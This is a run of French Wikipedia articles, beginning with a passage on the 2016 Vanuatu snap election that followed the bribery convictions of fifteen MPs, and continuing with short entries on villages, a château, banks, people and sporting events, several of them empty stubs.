Le , quinze députés de la majorité parlementaire de Sato Kilman sont condamnés pour corruption. Le vice-Premier ministre Moana Carcasses Kalosil est reconnu coupable d'avoir soudoyé les quatorze autres quelques mois plus tôt pour qu'ils votent la destitution du gouvernement de Joe Natuman. Carcasses est condamné à quatre ans de prison ferme. Le ministre des Travaux publics Tony Nari, à trois ans et demi de prison. Le ministre des Finances Willie Jimmy, le seul accusé à avoir plaidé coupable, reçoit une peine de vingt moins de prison avec sursis. Les autres (Marcellino Pipite, président du Parlement ; Serge Vohor, ministre des Affaires étrangères ; Paul Telukluk, ministre des Terres ; Thomas Laken, ministre du Changement climatique ; Tony Wright, ministre de la Jeunesse et des Sports ; et les simples députés Pascal Iauko, Jonas James, John Amos, Steven Kalsakau, Silas Yatan, Arnold Prasad et Jean-Yves Chabot) sont tous condamnés à trois ans de prison. Les quatorze députés condamnés à trois ans ou plus de prison perdent immédiatement leur siège de député. Le Premier ministre Kilman n'ayant pas de majorité pour gouverner et ayant refusé de former un gouvernement d'union nationale avec l'opposition, le président de la République, Baldwin Lonsdale, dissout le Parlement le , et annonce des élections législatives anticipées.
Système électoral.
Les députés sont élus pour quatre ans au vote unique non transférable dans des circonscriptions électorales de un à sept sièges. Lorsqu'un seul siège est en jeu, le vote prend de fait la forme d'un scrutin uninominal majoritaire à un tour.
Après l'élection, les nouveaux députés doivent choisir un nouveau premier ministre, ou bien renouveler leur confiance dans le premier ministre sortant, Sato Kilman.
Difficultés.
L'annonce d'élections anticipées, avec un calendrier serré, n'a pas permis une mise à jour complète des listes électorales. Ainsi, les citoyens ayant atteint l'âge de 18 ans entre et la date du scrutin, et qui auraient donc été en droit de voter, sont exclus car ils n'ont pas pu être ajoutés aux listes. Par ailleurs, des citoyens décédés n'ont pas été retirés des listes, notamment dans les circonscriptions des îles rurales isolées, où il n'y a parfois pas de registre officiel des décès. Pour autant, la mission d'observation électorale envoyée par le Commonwealth des nations à la demande du Vanuatu, et dirigée par l'ancien premier ministre bahaméen Hubert Ingraham, indique que les élections se sont déroulées sans souci majeur.
Partis et candidats.
Partis et dirigeants.
Depuis les élections de 1987, aucun parti n'a pu remporter une majorité absolue de sièges au Parlement, en raison de la fragmentation et de la multiplication des partis politiques. La composition du prochain gouvernement dépendra donc de la coalition qui se mettra en place, en fonction des forces en présence.
Le Vanua'aku Pati et l'Union des partis modérés étaient initialement les deux grands partis du pays - le premier étant principalement anglophone et se réclamant d'un socialisme mélanésien, tandis que le second, francophone, était davantage conservateur. Ces différences se sont quelque peu estompées, permettant aux partis de se retrouver au sein d'un même gouvernement. Ces deux mouvements ont en outre connu des sécessions ; le Parti national unifié et le Parti républicain, notamment, étaient à l'origine des factions dissidentes du Vanua'aku Pati et de l'UPM, respectivement. Le Parti progressiste mélanésien est également le fruit de dissidents ayant quitté le Vanua'aku Pati.
Les quinze députés condamnés pour corruption sont interdits de participation à cette élection, étant interdits d'exercer tout mandat public pendant dix ans.
Pour ces élections, 263 candidats se présentent, dont 50 sans étiquette et les autres représentant vingt-sept partis politiques différents. Il y a seulement huit femmes parmi les candidats - deux de moins qu'en 2012.
Résultats.
Comme à l'accoutumée, aucun parti n'approche de la majorité absolue des sièges. Les deux partis « historiques » (le Vanua'aku Pati de l'ancien Premier ministre Joe Natuman, et l'Union des partis modérés privé de son dirigeant Serge Vohor condamné pour corruption) talonnent le jeune parti Terre et Justice de Ralph Regenvanu, arrivé en tête. Le premier ministre et le chef de l'opposition sortants, Sato Kilman et Joe Natuman, conservent chacun leur siège de député. Kilman est toutefois le seul député de son propre parti, le Parti progressiste populaire, à être élu. Aucune femme n'est élue.
Après quatre mandats de député, l'ancien président du Parlement Philip Boedoro est largement battu dans sa circonscription de Maewo par le « magnat du transport maritime » Ian Wilson, candidat sans étiquette représentant une association locale. Robert Bohn, ancien ministre de la Justice, le seul acquitté parmi les députés accusés de corruption, mais condamné aux États-Unis en 2005 pour racket et blanchiment d'argent, est battu dans sa circonscription à Epi. À Tongoa, où le député sortant John Amos est en prison pour corruption, les citoyens ont élu son cousin et partisan Kalo Pakoasongi Lano. Willie Jimmy, chef du Parti démocrate libéral et député sortant à Port Vila, reconnu coupable de corruption mais condamné avec sursis, est battu et perd son siège.
Par circonscription.
Les résultats sont les suivants :
Ambae : 3 députés
Ambrym : 2 députés
îles Banks et îles Torrès : 2 députés
Éfaté (hors Port-Vila) : 4 députés
Le décompte initial donne Nato Taiwia réélu, et Gillion William battu. Un recompte des voix accordé par les tribunaux inverse ce résultat au mois d'avril, et déclare Gillion William réélu avec trois voix d'avance. Ceci confère au parti Terre et Justice le plus grand nombre de sièges au Parlement, et consolide la majorité gouvernementale.
Épi : 2 députés
Luganville : 2 députés
Maewo : 1 député
Malekula : 7 députés
Malo et Aore : 1 député
Paama : 1 député
Pentecôte : 4 députés
Port-Vila : 6 députés
Santo : 7 députés
Shepherds : 1 député
îles du sud : 1 député
Tanna : 7 députés
Tongoa : 1 député
Formation d'un gouvernement.
Début février, les trois partis arrivés en tête s'accordent en vue de former une coalition, avec l'appui de plusieurs autres partis dont le Parti national unifié, la Confédération verte et Nagriamel. Ils s'entendent sur la nécessité de réformer le système politique afin d'empêcher les changements d'allégeance et les motions de défiance qui caractérisent la vie politique du pays depuis les années 1990. 
Le Parlement procède à l'élection du Premier ministre le . Dix partis politiques s'unissent en une coalition. Charlot Salwai, à la tête du parti Réunification des mouvements pour le changement, qui dispose de trois sièges, est le seul candidat au poste de Premier ministre, et est approuvé à ce poste par les voix de quarante-six députés sur cinquante-deux. Sa coalition inclut notamment le Vanua'aku Pati et le parti Terre et Justice ; Salwai, issu de la minorité francophone, est perçu comme un candidat de compromis entre les partis nationalistes, principalement anglophones, et les partis francophones de centre-droit. Esmon Saimon, du Vanua'aku Pati (centre-gauche, nationaliste), est par ailleurs élu à la présidence du Parlement.
Ishmael Kalsakau (UPM) devient le chef de l'opposition parlementaire, secondé par Sato Kilman (Parti progressiste populaire), tandis que Christophe Emelee (Parti du développement national du Vanuatu) est le "chief whip" de l'opposition.
Suites.
Le , un mois après l'élection, Havo Molisale, député de la circonscription Malo et Aore pour le parti Nagriamel, décède subitement. Une élection partielle a lieu le pour pourvoir le siège vacant. Elle est remportée par Uri Warawara, le candidat du parti Terre et Justice, qui obtient 30 % des voix, devant notamment le candidat sans étiquette George Wells, ancien président du Parlement.
Le , Jerry Kanas, député d'Éfaté, décède d'une crise cardiaque. Il avait été élu sans étiquette avant de rejoindre le Parti des dirigeants de Vanuatu. Début septembre, Edwin Kalorisu, de ce même parti, remporte l'élection partielle pour lui succéder.
Le Vanua'aku Pati ayant quitté le gouvernement et rejoint l'opposition en cours de législature, le président du Parlement, Esmon Saimon, quitte la présidence pour siéger avec les autres membres de son parti. Début , les députés élisent à cette fonction Seule Simeon, issu de la Réunification des mouvements pour le changement, le parti du Premier ministre.

</doc>
<doc id="9622756" url="https://fr.wikipedia.org/wiki?curid=9622756" title="Donje Sajlovo">
Donje Sajlovo



</doc>
<doc id="9622759" url="https://fr.wikipedia.org/wiki?curid=9622759" title="Élections en 2016">
Élections en 2016



</doc>
<doc id="9622766" url="https://fr.wikipedia.org/wiki?curid=9622766" title="Saut à la corde">
Saut à la corde



</doc>
<doc id="9622769" url="https://fr.wikipedia.org/wiki?curid=9622769" title="Falcatoflabellum raoulensis">
Falcatoflabellum raoulensis

Falcatoflabellum raoulensis est une espèce de coraux appartenant à la famille des Flabellidae.

</doc>
<doc id="9622777" url="https://fr.wikipedia.org/wiki?curid=9622777" title="R3 (entreprise)">
R3 (entreprise)

R3 ou R3 CEV est une entreprise spécialisée dans la technologie blockchain. Elle est fondée en 2014. Son siège est situé à New York. Elle coopère avec un grand nombre d'institutions financières pour développer les questions autour des blockchains.

</doc>
<doc id="9622803" url="https://fr.wikipedia.org/wiki?curid=9622803" title="Kagamine Rin">
Kagamine Rin



</doc>
<doc id="9622805" url="https://fr.wikipedia.org/wiki?curid=9622805" title="Kagamine Len">
Kagamine Len



</doc>
<doc id="9622820" url="https://fr.wikipedia.org/wiki?curid=9622820" title="Josh Pate">
Josh Pate

Josh Pate (né Joshua Warren le est un scénariste, réalisateur et producteur de télévision américain. Il a écrit "", "Le Suspect idéal" et "The Take". Il est également le cocréateur de "Good Versus Evil" et "Surface".
Jeunesse.
Josh Pate naît le en Caroline du Nord. Il est le frère jumeau de Jonas Pate.
En 1992, Pate obtient un baccalauréat universitaire de lettres en anglais de l'Université de Caroline du Nord à Chapel Hill.
Carrière.
En 1996, Pate commence sa carrière comme scénariste et travaille avec son frère sur le thriller "". Le film reçoit plusieurs critiques positives après avoir été diffusé au Festival du film de Sundance. L'année suivante, les frères travaillent sur "Le Suspect idéal".
' créent par la suite l'émission de télévision de fantasy/action "Good Versus Evil" (1999). Par la suite, Josh Pate réalise deux épisodes de "Fastlane" (2002-2003), puis, de 2003 à 2004, il est coproducteur exécutif de ', dont il écrit également deux épisodes.
En 2005, il est cocréateur de la série de science-fiction "Surface", diffusée jusqu'en 2006. Lors de cette période, il réalise le clip de la chanson "Please" de Chris Isaak et un épisode de "Friday Night Lights". 
Josh Pate coécrit par la suite le scénario de "The Take" (2007). De 2007 à 2008, il est consultant producteur pour la série de romance paranormale "Moonlight".
En 2012, il est producteur exécutif de la comédie/fantasy "Blanche-Neige". Il est par la suite engagé avec son frère pour scénariser le film indépendant "Way Down South".
En 2020,il réalise,avec son frère Jonas Pate, la série Outer Banks.Elle est notamment diffusée sur Netflix.

</doc>
<doc id="9622824" url="https://fr.wikipedia.org/wiki?curid=9622824" title="Jakubowice Murowane">
Jakubowice Murowane

Jakubowice Murowane (prononciation : ) est un village polonais de la gmina de Wólka dans le powiat de Lublin de la voïvodie de Lublin dans l'est de la Pologne.
Le village est le siège administratif (chef-lieu) de la gmina appelée gmina de Wólka.
Il se situe à environ au nord-est de Lublin (siège du powiat et capitale de la voïvodie).
Le village comptait approximativement une population de 249 habitants en 2014.
Histoire.
De 1975 à 1998, le village est attaché administrativement à l'ancienne Voïvodie de Lublin.&lt;br&gt;
Depuis 1999, il fait partie de la nouvelle voïvodie de Lublin.

</doc>
<doc id="9622829" url="https://fr.wikipedia.org/wiki?curid=9622829" title="Abdel Malak al-Mekhlafi">
Abdel Malak al-Mekhlafi

Abdel Malak al-Mekhlafi (), né le dans le gouvernorat de Ta'izz, est un homme politique yéménite. Il est vice-Premier ministre et ministre des Affaires étrangères du au .
Biographie.
Il est né le dans un village du gouvernorat de Ta'izz.
Le , il est nommé vice-Premier ministre et ministre des Affaires étrangères, en remplacement de Riad Yassine.
Le , dans le contexte de la guerre civile yéménite, il annonce un cessez-le-feu de sept jours à partir du 15 du même mois, avec les rebelles Houthis.
Le , il quitte son poste aux Affaires étrangères, étant de santé fragile du fait de problèmes cardiaques. Khaled al-Yamani lui succède.

</doc>
<doc id="9622849" url="https://fr.wikipedia.org/wiki?curid=9622849" title="Championnat du Népal de football 2015">
Championnat du Népal de football 2015

La saison 2015 du Championnat du Népal de football est la quarante-troisième édition de la "Nepal National League", le championnat de première division au Népal. Les neuf formations sont réunies au sein d'une poule unique où elles s'affrontent deux fois au cours de la saison. Toutes les rencontres sont disputées au Stade Dasarath Rangasala. 
C'est le Three Star Club qui remporte la compétition cette saison après avoir terminé en tête du classement final, avec deux points d'avance sur le Nepal Army Club et quatre sur le tenant du titre, Manang Marsyangdi Club. Il s'agit du cinquième titre de champion du Népal de l'histoire du club.
Seuls cinq des onze participants de la précédente saison sont autorisés par la fédération à prendre part à la compétition. Quatre nouvelles formations font quant à elles leur début au plus haut niveau.
Le championnat a été affecté par les séismes du mois d'avril, il est interrompu le pour reprendre le . Le championnat sera suspendu les saisons suivantes en raison de problèmes internes à la fédération népalaise de football et ne reprendra que fin 2018.
Compétition.
Le barème de points servant à établir le classement se décompose ainsi :

</doc>
<doc id="9622861" url="https://fr.wikipedia.org/wiki?curid=9622861" title="Château de Varennes (Rhône)">
Château de Varennes (Rhône)

Le château de Varennes est un ancien château fort, du , remanié au et qui se dresse sur la commune française de Quincié-en-Beaujolais dans le département du Rhône en région Rhône-Alpes.
Situation.
Le château de Varennes est situé dans le département français du Rhône, au nord-ouest de Lyon, sur la commune de Quincié-en-Beaujolais, offrant un panorama sur le mont Brouilly.
Rattaché à la commune de Quincié-en-Beaujolais lors de la Révolution française, le château appartenait initialement à l'ancienne seigneurie de Varennes qui s'étendait sur la quasi-totalité de l'actuelle commune de Marchampt, la vallée de Romarand et quelques hameaux de l'ouest de Quincié. 
Histoire.
Du , différentes familles ont possédé le château de Varennes.
Le château de Varennes a suivi la fortune de ses maîtres : modeste et humble sous les Villion et les Maréchal, il dut être riche et magnifique au temps des sires de Beaujeu et de la puissante famille des Nagu qui posséda Varennes de 1395 à 1769.
Au , le fief appartient à Pierre de Varennes et ses descendants. Au , le jeudi après Pâques 1322, Hugonin Maréchal, fils de Geoffroy, vendit Varennes à Guichard V, Sire de Beaujeu.
En 1395 Édouard II, Sire de Beaujeu, donna la terre de Varennes au Sieur Jean Nagu, son écuyer, pour lui et ses descendants afin, disait-il, de le récompenser de ses services.
Ainsi tout au long du , la famille Nagu marqua l'histoire du lieu. La famille Nagu avait reçu son nom du fief de Nagu situé à Ouroux dans le Rhône. Les Nagu seront anoblis plus tard. François de Nagu obtint l'érection de la Seigneurie de Varennes en marquisat par lettres patentes de . 
Il fut un personnage : nommé bailli et gouverneur de Mâcon par la reine Marie de Médicis en 1611, gentilhomme du roi Louis XIII, conseiller d’État en 1617, maréchal de camp sous le prince de Condé, ambassadeur extraordinaire en Suède en 1630, commandant en Bresse, Bugey et Bourgogne, nommé en 1637 Lieutenant Général des Armées du Roi, il mourut à Aigues-Mortes et fut inhumé à Marchampt.
Les Nagu, éblouis par les splendeurs de la capitale et les fêtes du château de Versailles, avaient quitté la province et s'étaient établis à Paris. Charles Gabriel de Nagu vendit le Marquisat de Varennes en 1769 à Monsieur Pierre Giraud, officier des cent gardes suisses du corps du Roi et secrétaire du Roi auprès de la cour des monnaies de Lyon.
Pierre Giraud se trouvait à la Toussaint 1793 dans son bois de Montoux et faisait marquer des arbres, quand deux gendarmes se présentèrent avec un mandat d’arrêt. Après un séjour en prison, il passa en jugement. Il fut accusé de s’être trouvé aux Tuileries la Journée du 10 août 1792 et d’avoir favorisé la fuite du Roi Louis XVI. Le , il fut condamné à mort et guillotiné, fait exceptionnel dans le Rhône.
Le château fut confisqué, déclaré propriété nationale et mis en vente en 16 lots au plus offrant à la bougie éteinte.
Diverses enchères s’ensuivirent. Les frères Allemand achetèrent Varennes. Le , François et Hector Allemand vendirent le château de Varennes à Antoine-Marie Belliard et à son gendre Jean Mathieu, demeurant à Saint-Lager, ancêtres de la famille Charvériat, originaire de l’Ain (Montceaux et Chaveyriat), qui en est propriétaire depuis plus de deux siècles.
Architecture.
Le château actuel comporte des parties subsistantes du , et les communs datent du .
La première construction de ce château date du milieu du et on peut encore admirer le pavillon d’entrée qui précède les communs. Cette Tour Carrée, parfaitement conservée, présente des fenêtres à meneaux, un bel escalier de pierre et une cave dont la voûte est soutenue par un pilier central. Après le , Varennes évolue d’une place forte à une demeure seigneuriale : les fossés sont comblés.
Les communs, bâtiments des vignerons, datent du début du . Ils comportent une magnifique halle supportée par des piliers de bois aux moulures gothiques. Elle donne accès aux caves agrandies au et au cuvage où le vin de la propriété est élevé.
À l’ouest, les écuries ont été construites au . On peut admirer les pierres sculptées en volutes qui encadrent les porches construits pour faciliter l’entrée des attelages. Dans la partie droite de ce bâtiment subsiste un four à pain qui précéda la construction d’un four plus récent placé dans la petite dépendance au centre de cette cour.
Le pigeonnier seigneurial, avec ses alvéoles et son échelle pivotante, date de la fin du , tout comme les restes de la chapelle, sous le vocable de Saint-Émilien, bâtie un peu plus loin au milieu des vignes par Jean de Nagu en 1577.
La partie principale du château a été presque entièrement reconstruite à la fin du . 
Pendant les guerres de Religion, les Huguenots pillèrent et ravagèrent Varennes à plusieurs reprises, notamment en 1563 où la châtelaine d’alors se sauva et ne dut son salut qu’à son déguisement de servante. Son fils, le chanoine Pierre de Nagu, déshabillé, puis revêtu d’un costume de mendiant, fut traîné sur un âne jusqu’à Belleville où il mourut peu après.
Les tours rondes aux toits coniques sont décorées de niches agrémentées d’une coquille Saint-Jacques, symbole fréquemment utilisé à la Renaissance.
La cour intérieure, exposée plein sud, est encadrée de bâtiments agencés en fer à cheval. En son centre subsiste le puits, élément vital du château. Les toitures très pentues, aux tuiles plates bourguignonnes, représentent une superficie d’environ un hectare. La charpente à la française rappelle l’ossature d’un bateau dont certains poinçons sont sculptés.
La galerie Renaissance aux arcs en anse de panier, a été construite devant une façade encore gothique lors des grands remaniements de 1577.
L’escalier d’honneur en pierre de taille, à rampe droite, se situe dans l’aile ouest.
Activités actuelles.
Le domaine du château de Varennes exploite de vignes en cépage gamay et chardonnay, exposés au Sud, sur des coteaux granitiques, appellation Beaujolais-villages. Par ailleurs le château accueille des réceptions et séminaires privés.

</doc>
<doc id="9622863" url="https://fr.wikipedia.org/wiki?curid=9622863" title="Norðurfjörður">
Norðurfjörður

Le Norðurfjörður est un fjord situé dans la commune d'Árneshreppur, dans le comté de Strandasýsla dans la région des Vestfirðir en Islande.
Le Norðurfjörður, long de , est situé au nord de la baie de Trékyllisvík et au sud du Ingólfsfjörður, à l'ouest de la baie de Húnaflói. Le Krossnesfjall et les montagnes de Kálfatindar s'élèvent à au-dessus du fjord.
On y accède par la route 643 qui traverse la vallée de Meladalur vers l'Ingólfsfjörður, puis par le chemin de l'Ófeigsfjördur ; n'étant ni bitumée ni entretenue pendant l'hiver, cette route n'est praticable que du avril au 31 décembre et une voiture de type 4x4 est recommandée. Le bus de Brú qui passait une fois par semaine n'est plus référencé dans les fiches horaires.
La plupart des maisons de la région sont désertes mais certaines servent de résidence d'été, et un petit magasin est ouvert en saison. Une piscine d'eau chaude, la Krossneslaug, se trouve à la pointe de Krossnes sur la côte nord. 

</doc>
<doc id="9622871" url="https://fr.wikipedia.org/wiki?curid=9622871" title="Bairon et ses environs">
Bairon et ses environs

Bairon et ses environs est une commune nouvelle française située dans le département des Ardennes, en région Grand Est.
Elle est créée le de la fusion des trois communes : Le Chesne, Louvergny et Les Alleux.
Géographie.
Localisation.
Il y a trois villages : Le Chesne, Louvergny et Les Alleux, situés dans le département des Ardennes.
Géologie et relief.
Il convient de se reporter aux articles consacrés aux anciennes communes fusionnées.
Hydrographie.
La commune est traversée par la ligne de partage des eaux entre les bassins hydrographiques Rhin-Meuse et Seine-Normandie. Elle est drainée par le canal des Ardennes (versant Aisne), le canal des Ardennes (versant Meuse), le ruisseau de Bairon, le ruisseau de la Lateuse, le ruisseau de Haute Bernelle, la Fosse de la Barbonne, le ruisseau de L Étang des Vivaubieres, le ruisseau des Petits Étangs, le ruisseau des Aules, la Fosse d'Assain, le ruisseau des Craquinettes, le cours d'eau 02 de la commune de Voncq, le cours d'eau 01 de la Noue des Prêtres et divers autres petits cours d'eau.
Le canal des Ardennes (versant Aisne), d'une longueur de , est un chenal et un cours d'eau naturel navigable qui a son origine dans la commune de Dom-le-Mesnil et se jette dans le canal latéral à l'Aisne à Vieux-lès-Asfeld, après avoir traversé . Il traverse la commune sur une longueur d'environ .
Le canal des Ardennes (versant Meuse), d'une longueur de , est un chenal et un cours d'eau naturel navigable qui a son origine dans la commune de et se jette dans la Meuse à Dom-le-Mesnil, après avoir traversé .
Le ruisseau de Bairon, d'une longueur de , prend sa source dans la commune de La Horgne et se jette dans la Bar à Tannay, après avoir traversé .
Trois plans d'eau complètent le réseau hydrographique : le lac de Bairon, d'une superficie totale de ( sur la commune), l'étang de la Maison Rouge () et l'étang de la Motte ().
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat de montagne, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols, etc.) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans une zone de transition entre les régions climatiques « Nord-est du bassin Parisien » et « Lorraine, plateau de Langres, Morvan ». Elle est en outre dans la zone H1b au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Buzancy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Pour afficher une liste d’indicateurs climatiques caractérisant la commune aux horizons 2030, 2050 et 2100 et pouvoir ainsi s'adapter aux changements climatiques, entrer son nom dans Climadiag-commune, un site de Météo-France élaboré à partir des nouvelles projections climatiques de référence DRIAS-2020.
Urbanisme.
Typologie.
Au , Bairon et ses environs est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à définie par l'Insee en 2022.
Elle est située hors unité urbaine et hors attraction des villes.
Toponymie.
Bairon est attesté sous les formes "Bairo" au , "Bairona" en 1145, "Bairon" en 1196, "Bairons" en 1202, "Bayronnum" en 1316.&lt;br&gt;
Du nom de Bairon, ancien village des bords du lac éponyme. Le lac ainsi que la rivière portent en effet le même nom.&lt;br&gt;
Son nom vient du ruisseau homonyme qui se jette dans la Bar. "Bairon" est un diminutif de "Bar".
Le nom de la nouvelle commune demeure cependant discuté, car celui-ci serait trop long, posant notamment problème lorsque les habitants renseignent leur adresse. Des alternatives comme "Bairon-le-Lac", simplement "Bairon", ou même le retour du nom de la localité principale "Le Chesne" ont été évoqués, sans que rien ne soit fait jusqu'à présent.
Histoire.
La création de la nouvelle commune est effective depuis le, entraînant la transformation des trois anciennes communes en « communes déléguées » dont la création a été entériné par l'arrêté du 30 novembre 2015.
Politique et administration.
Composition.
Jusqu'aux prochaines élections municipales de 2020, le conseil municipal de la nouvelle commune est constitué de l'ensemble des conseillers municipaux des anciennes communes. Les maires des trois communes deviennent maires délégués de chacune des anciennes communes.
Économie.
Agriculture et élevage. Le Chesne compte plusieurs petits commerces (boulangerie, salon de coiffure, café...).
Culture locale et patrimoine.
Personnalités liées à la commune.
Il convient de se reporter aux articles consacrés aux anciennes communes fusionnées.
Voir aussi.
Bibliographie.
Il convient de se reporter aux articles consacrés aux anciennes communes fusionnées.

</doc>
<doc id="9622872" url="https://fr.wikipedia.org/wiki?curid=9622872" title="Nedbank">
Nedbank

Nedbank Group est un groupe de services financiers sud-africain proposant des services bancaires de gros et de détail, ainsi que des services d'assurance, de gestion d'actifs et de gestion de patrimoine. Nedbank Limited est une filiale à 100 % de Nedbank Group.
Le principal marché de Nedbank est l'Afrique du Sud. Nedbank est également présente en Eswatini, Lesotho, Mozambique, Namibie et Zimbabwe, ainsi que dans des bureaux au Ghana et au Kenya.
Histoire.
La banque a été fondée en 1888 à Amsterdam sous le nom de "Nederlandsche Bank" en Credietvereeniging voor Zuid-Afrika (« Banque et coopérative de crédit néerlandaises pour l'Afrique du Sud »). En août de la même année, la banque a ouvert une agence à Church Street, à Pretoria, en Afrique du Sud, avec pour mission de fournir des crédits et des services bancaires en Afrique du Sud et avec l'Afrique du Sud.
En 1903, la société a été rebaptisée Nederlandsche Bank voor Zuid-Afrika (« Banque néerlandaise pour l'Afrique du Sud »). En 1906, la banque s'est agrandie et un bureau a été ouvert à Londres. En 1925, la NBvZA fusionna avec la Transvaalsche Handelsbank.
En mai 1940, l'Allemagne envahit et occupa les Pays-Bas, ce qui eut des répercussions sur la gestion de l'agence sud-africaine de ce pays.  Le siège social sud-africain et sa succursale de Londres disposaient de suffisamment d'actifs en livres sterling, en dollars et en or pour couvrir leurs passifs.  Comme il s'agissait d'une agence et que son siège social néerlandais n'était plus sous son contrôle, le gouvernement sud-africain nomma un contrôleur pour diriger la banque jusqu'en 1945. Sa part du marché bancaire sud-africain en 1945 se situait entre 2 et 3 %.
Le groupe Nedbank est né de la fusion de Syfrets SA, Union Acceptances et Nedbank en 1973. En 1986, Old Mutual est devenu l'actionnaire majoritaire (53 %) de Nedbank.
En 1992, Syfrets, UAL Merchant Bank et la division Nedbank Investment Bank ont fusionné pour former Nedcor Investment Bank (NIB). Old Mutual, la holding de Nedcor, a été démutualisée et cotée à la Bourse de Londres en 1999.
Le nouveau groupe Nedcor a été créé le 1er janvier 2003, regroupant Nedcor, BoE, Nedcor Investment Bank et Cape of Good Hope Bank en une seule entité juridique. Le groupe Nedcor a été rebaptisé groupe Nedbank le 6 mai 2005. En août 2009, Nedbank a acquis les 49,9 % d'Imperial Bank South Africa qu'elle ne possédait pas, de sorte qu'Imperial Bank South Africa est entièrement détenue par Nedbank.
En , Nedbank acquiert une participation de 20 % dans Ecobank, en convertissant sa créance dans Ecobank de 285 millions de dollars en action.

</doc>
<doc id="9622877" url="https://fr.wikipedia.org/wiki?curid=9622877" title="Ahmad Tajuddin">
Ahmad Tajuddin

Ahmad Tajuddin, né le à Bandar Brunei et mort le à Singapour, est le sultan de Brunei. Il a régné du à sa mort.
C'est sous son règne que d'importants gisements pétroliers sont découverts à Seria en 1929.

</doc>
<doc id="9622881" url="https://fr.wikipedia.org/wiki?curid=9622881" title="Florence Barker (natation)">
Florence Barker (natation)

Florence Barker (née le et morte en ) est une nageuse britannique.
Carrière.
Florence Barker a représenté la Grande-Bretagne aux Jeux olympiques d'été de 1924 à Paris où elle a remporté la médaille d'argent, arrivant à la deuxième place de l'équipe des nageuses britanniques dans l'épreuve de 4 × 100 mètres nage libre.
En compétition individuelle, elle s'est qualifiée pour les demi-finales du 100 mètres nage libre, terminant au neuvième rang.

</doc>
<doc id="9622896" url="https://fr.wikipedia.org/wiki?curid=9622896" title="Gare d'Anneville-sur-Scie">
Gare d'Anneville-sur-Scie

La gare d'Anneville-sur-Scie était une gare ferroviaire française de la ligne de Malaunay - Le Houlme à Dieppe, située sur le territoire de la commune d'Anneville-sur-Scie dans le département de la Seine-Maritime en région Normandie.
C'est une ancienne halte voyageurs de la Société nationale des chemins de fer français fermée au début du .
Situation ferroviaire.
Établie à d'altitude, la gare d'Anneville-sur-Scie était située au point kilométrique (PK) 188,863 de la ligne de Malaunay - Le Houlme à Dieppe (portion à voie unique), entre les gares ouvertes de Longueville-sur-Scie et de Saint-Aubin-sur-Scie.
Histoire.
Le 2 août 1941, la voie ferrée est mitraillée par un avion allié en gare d'Anneville-sur-Scie.
En 1999, la halte est encore desservie par 3 (sens Rouen-Dieppe) ou 4 (sens Dieppe-Rouen) trains quotidiens en semaine, mais ne l'est plus en 2002

</doc>
<doc id="9622902" url="https://fr.wikipedia.org/wiki?curid=9622902" title="U.S. Girls">
U.S. Girls

U.S. Girls est un groupe de pop expérimentale américano-canadien. Il est formé en 2007 par Meghan Remy, seule membre constante du groupe. Remy collabore avec nombre de musiciens torontois à l'écriture et la production.
L'album "Half Free" est nommé du Juno Award dans la catégorie aux Juno Awards 2016 et devient finaliste pour le Polaris Music Prize.

</doc>
<doc id="9622904" url="https://fr.wikipedia.org/wiki?curid=9622904" title="Alexander Roinashvili">
Alexander Roinashvili



</doc>
<doc id="9622913" url="https://fr.wikipedia.org/wiki?curid=9622913" title="Spend Spend Spend">
Spend Spend Spend

 est une comédie musicale basée sur un livret et des musiques de .
La première a eu lieu en 1998 et a remporté le prix de la meilleure comédie musicale de l'année. Depuis elle a remporté de nombreux prix.
Le spectacle a fait l'objet d'une tournée au Royaume-Uni entre septembre et .
Synopsis.
En 1961, une femme du Yorkshire gagne £152,319 dans un pari sportif. Quand un journaliste lui demande ce qu'elle compte faire de cet argent, elle lui répond «  » (« dépenser, dépenser, dépenser »).

</doc>
<doc id="9622931" url="https://fr.wikipedia.org/wiki?curid=9622931" title="First Rand">
First Rand

FirstRand Limited, également connu sous le nom de FirstRand Group, est la société holding de FirstRand Bank et un prestataire de services financiers en Afrique du Sud. Il est l'un des prestataires de services financiers agréés par la Banque de réserve d'Afrique du Sud, l'autorité nationale de régulation bancaire.
Cotée à la Bourse de Johannesbourg et à la Bourse de Namibie, FirstRand Limited est l'une des plus grandes institutions financières d'Afrique du Sud. Elle propose des produits et services bancaires, d'assurance et d'investissement aux particuliers, aux entreprises, aux grandes entreprises et au secteur public. Outre l'Afrique du Sud, le groupe est présent dans huit pays africains clés: le Botswana, la Namibie, l'Eswatini, le Lesotho, la Zambie, le Mozambique, la Tanzanie, le Ghana et le Nigéria. FirstRand Bank possède des succursales à Londres, à Guernesey et en Inde.
Histoire.
L'histoire du groupe FirstRand remonte aux années 1970, en tant que banque d'investissement. Le groupe actuel a été créé le 1er avril 1998, par la fusion des participations dans les services financiers d"'Anglo American Corporation of South Africa Limited" (aujourd'hui Anglo American plc) et de RMB Holdings (RMBH), afin d'atteindre l'objectif d'un groupe unifié de services financiers.
En novembre 2012, la Banque centrale du Nigéria a délivré les premières licences de banque d’affaires depuis plus d’une décennie à RMB Nigeria et à une autre entreprise locale.
En novembre 2017, First Rand annonce l'acquisition de la banque britannique Aldermore, ayant environ 1 000 employés, pour 1,1 milliard de livres, dans le but de la réunir avec sa filiale locale MotoNovo, spécialisée dans le financement de véhicules.
En 2024, un tribunal britannique a condamné Close Brothers Group et First Rand pour vente abusive de prêts aux acheteurs de voitures. Ils versaient des commissions à des concessionnaires automobiles pour avoir recommandé leurs prêts, sans que ces derniers les révèlent aux acheteurs. First Rand a contesté les conclusions du tribunal.

</doc>
